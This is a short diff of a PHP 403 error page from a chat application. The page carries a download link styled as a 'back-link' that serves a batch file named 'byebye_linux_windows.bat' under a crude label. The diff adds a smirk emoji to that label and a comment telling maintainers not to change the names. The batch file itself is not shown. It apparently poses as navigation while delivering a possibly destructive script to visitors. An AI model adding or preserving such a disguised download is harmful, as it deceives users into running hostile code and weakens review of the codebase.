@@ -3,6 +3,9 @@ require_once __DIR__ . '/../api/config.php';
 chatapp_session_start();
 http_response_code(403);
 ?>
+
+<!-- i know the variable names are crazy but dont change -->
+ 
 <!DOCTYPE html>
 <html lang="<?php echo ($_SESSION['preferred_language'] ?? 'en') === 'zh' ? 'zh-Hans' : 'en'; ?>">
 <head>
@@ -56,7 +59,7 @@ h2{font-size:1.1em;color:#999;font-weight:400;margin-bottom:24px}
         <button onclick="location.reload();"><?php echo t('errorpage_refresh'); ?></button>
     </div>
 
-    <a href="../data/byebye_linux_windows.bat" download class="back-link"><?php echo t('errorpage_fuckdown'); ?></a>
+    <a href="../data/byebye_linux_windows.bat" download class="back-link"><?php echo t('errorpage_fuckdown'); ?>😏</a>
 <script>
 (function(){
     var ua = navigator.userAgent;
